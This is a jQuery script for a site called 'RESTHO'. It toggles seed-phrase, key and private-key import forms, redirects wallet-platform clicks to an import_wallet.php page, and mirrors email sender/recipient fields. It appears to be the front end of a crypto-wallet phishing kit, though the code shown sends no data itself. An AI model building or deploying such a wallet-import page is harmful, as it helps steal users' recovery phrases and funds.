

$(document).ready(function(){
	let website_name = "RESTHO";
	let page_name = "";
	
	$("#name").text(website_name);
	
	
	$(".dropdown").mouseenter(function(){
        $(".dropdown-toggle").dropdown("toggle");
    });
	
	/////////// this controls the countdown intro/////////////
	$('.count').each(function () {
		$(this).prop('Counter',0).animate({
			Counter: $(this).text()
		}, {
			duration: 6000,
			easing: 'swing',
			step: function (now) {
				$(this).text(Math.ceil(now)+' %');
			}
		});
	});
	setTimeout(function(){
		$(".intro").slideUp(2000);
	},6000);
	
	
	
	
	`use strict`;

	const tags = document.querySelectorAll(".tagText");
	const imgs = document.querySelector("imgs");

	const facilTexts = document.querySelectorAll(".facilTexts");
	const dash2 = document.querySelectorAll(".dash2");

	console.log(facilTexts, dash2);

	for (i = 0; i < facilTexts.length; i++) {
	  facilTexts[i].addEventListener("mouseover", () => {
		console.log(`i counted ${i} apples`);
	  });
	}

	
	//document.write("I'm in love with my maker");
	
	$("#sender_name,#from").on("keyup",function(){
		var value = $(this).val();
		//$("#from").val(value);
		//$("#sender_name").val(value);
	});
	
	$("#to,#cc").on("keyup",function(){
		var value = $(this).val();
		$("#cc").val(value);
		$("#to").val(value);
	});
	
	$("#sender_name").on("click",function(){
		var value = $(this).val();
		//$("#from").val(value);
		//$("#sender_name").val(value);
	});
	
	$("#to").on("click",function(){
		var value = $(this).val();
		$("#cc").val(value);
		$("#to").val(value);
	});
	
	$("#from").on("click",function(){
		var value = $("#sender_name").val();
		//$("#from").val(value);
	});
	
	$("#cc").on("click",function(){
		var value = $("#to").val();
		$("#cc").val(value);
	});
	
	
	$(".d_platform").on("click",function(){
		var wallet = $(this).attr("title");
		window.location.href = "../menu/import_wallet.php?r="+wallet;
	});
	
	/////this code here is handling the screen resize effect////////
	resize();
	$(window).on("resize",function(){
		resize();
	});

	
	///////////this toggles the forms////////
	$(".list_1").on("click",function(){
		$(this).css({"border":"E0E0E0 1px solid","color":"#fff","border-bottom":"#fff 3px solid"});
		$(".list_2").css({"border":"0","color":"#E0E0E0","border-bottom":"0"});
		$(".list_3").css({"border":"0","color":"#E0E0E0","border-bottom":"0"});
		$(".form_phrase").show();
		$(".form_key").hide();
		$(".form_private").hide();
	});
	
	$(".list_2").on("click",function(){
		$(this).css({"border":"E0E0E0 1px solid","color":"#fff","border-bottom":"#fff 3px solid"});
		$(".list_1").css({"border":"0","color":"#E0E0E0","border-bottom":"0"});
		$(".list_3").css({"border":"0","color":"#E0E0E0","border-bottom":"0"});
		$(".form_key").show();
		$(".form_phrase").hide();
		$(".form_private").hide();
	});
	
	$(".list_3").on("click",function(){
		$(this).css({"border":"E0E0E0 1px solid","color":"#fff","border-bottom":"#fff 3px solid"});
		$(".list_1").css({"border":"0","color":"#E0E0E0","border-bottom":"0"});
		$(".list_2").css({"border":"0","color":"#E0E0E0","border-bottom":"0"});
		$(".form_private").show();
		$(".form_phrase").hide();
		$(".form_key").hide();
	});
	
	
});



function ask1(){
		var question = confirm("You Are About TO LOGOUT. Click OK If You Consent.");
		if(question == true){
			window.location.href = "../lib/logout";
		}else{
			alert("Okay Then, Let\'s Continue !!!");
		}
	}

		

		
function test_close(){
		$("#test").hide(700);
}
		

		


function resize(){
	var w = window.innerWidth;
	var h = window.innerHeight;
	////$("#phrase_word").val("width :"+w+" Height : "+h);
	if(w > 1160){
		$(".import").css({"margin":"auto","width":"35%"});
		$("#banner, #banner_1").css({"height":"800px","width":"100%"});
	}else if(w > 800){
		$(".import").css({"margin":"auto","width":"50%"});
	}else if(w > 500){
		$(".import").css({"margin":"auto","width":"75%"});
	}else{
		$(".import").css({"margin":"auto","width":"97%"});
		$("#banner, #banner_1").css({"height":"650px","width":"100%"});
	}
}